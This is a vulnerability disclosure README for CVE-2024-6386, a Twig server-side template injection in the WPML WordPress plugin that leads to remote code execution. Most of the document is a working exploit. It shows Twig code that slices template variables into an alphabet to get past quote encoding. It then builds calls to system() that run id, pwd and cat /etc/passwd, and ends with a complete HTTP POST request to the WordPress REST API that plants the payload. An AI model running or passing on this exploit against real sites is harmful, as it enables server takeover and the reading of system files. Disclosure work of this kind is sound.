
# CVE-2024-6386 - RCE via Twig SSTI in WPML

## PoC
[PoC on Python+Selenium](./poc/)

Detailed research in Russian: [CVE-2024-6386](https://teletype.in/@argendo/cve-2024-6386)

![PoC example](./poc_example.png)

## CVSS

**Base Score:** `9.9`

**Vector:**  `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

## Summary

In [WPML](https://wpml.org) you are available to use specific [WordPress Shortcodes](https://codex.wordpress.org/Shortcode) that allows you to create macroses and render Twig templates too. So you can easily get an SSTI from it.

## Chain

### SSTI
For example, let's create a shortcode to exploit SSTI:
```
[wpml_language_switcher]
{{ 2*2 }}
[/wpml_language_switcher]
```
In this case we'll get `4` as a result of rendering our shortcode.

### RCE
Because of encoding all types of quotes to HTML by WordPress we aren't able to use typical payloads, such as: 
```
{{['id']|filter('system')}}
```

Nevertheless we can modify this payload to call OS commands from variables-letters such as: `(s = 's')`.

To do this we need to call some local variables such as:
- `css_classes`
- `languages`

First one will return us a string: `wpml-ls-statics-shortcode_actions wpml-ls`.
Second one returns an Array object of languages.

With help of this we can slice symbols we need and create our own alphabet.

So, here we make an alphabet: `[<space> ,a, c, i, d, s, y, t, e, m, p, w ]`

And yes we shoud concatenate `languages` with empty value to make a string with value `"Array"` from it.
```
{% set sp = css_classes|slice(33,1) %}
{% set a = css_classes|slice(10,1) %}
{% set c = css_classes|slice(13,1) %}
{% set i = css_classes|slice(12,1) %}
{% set d = css_classes|slice(23,1) %}
{% set s = css_classes|slice(6,1) %}
{% set y = languages|join|slice(4,1) %}
{% set t = css_classes|slice(9,1) %}
{% set e = css_classes|slice(24,1) %}
{% set m = css_classes|slice(2,1) %}
{% set p = css_classes|slice(1,1) %}
{% set w = css_classes|slice(0,1) %}
```

So after that we can concatenate our alphabet to payloads:
```
{% set system = s~y~s~t~e~m %}
{% set pwd = p~w~d %}
{% set id = i~d %}
{% set cat = c~a~t %}
{% set sl = [pwd]|map(system)|join|slice(0,1) %}
{% set passwd = c~a~t~sp~sl~e~t~c~sl~p~a~s~s~w~d %}
{{[id]|map(system)|join}}
{{[pwd]|map(system)|join}}
{{[passwd]|map(system)|join}}
```

## Burp Suite exploitation

### Command
```
POST /wp-json/wp/v2/posts/30?_locale=user HTTP/1.1
Host: vulned.com

{
    "id":30,
    "content":"<!-- wp:shortcode -->\n[wpml_language_switcher]\n{% set sp = css_classes|slice(33,1) %}{% set a = css_classes|slice(10,1) %}{% set c = css_classes|slice(13,1) %}{% set i = css_classes|slice(12,1) %}{% set d = css_classes|slice(23,1) %}{% set s = css_classes|slice(6,1) %}{% set y = languages|join|slice(4,1) %}{% set t = css_classes|slice(9,1) %}{% set e = css_classes|slice(24,1) %}{% set m = css_classes|slice(2,1) %}{% set p = css_classes|slice(1,1) %}{% set w = css_classes|slice(0,1) %}{% set system = s~y~s~t~e~m %}{% set pwd = p~w~d %}{% set cat = c~a~t %}{% set sl = [pwd]|map(system)|join|slice(0,1) %}{% set id = i~d %}{% set passwd = c~a~t~sp~sl~e~t~c~sl~p~a~s~s~w~d %}{{[id]|map(system)|join}}\n[/wpml_language_switcher]<!-- /wp:shortcode -->"
}
```
### Listing result
```
GET /?p=30 HTTP/1.1
Host: vulned.com
```

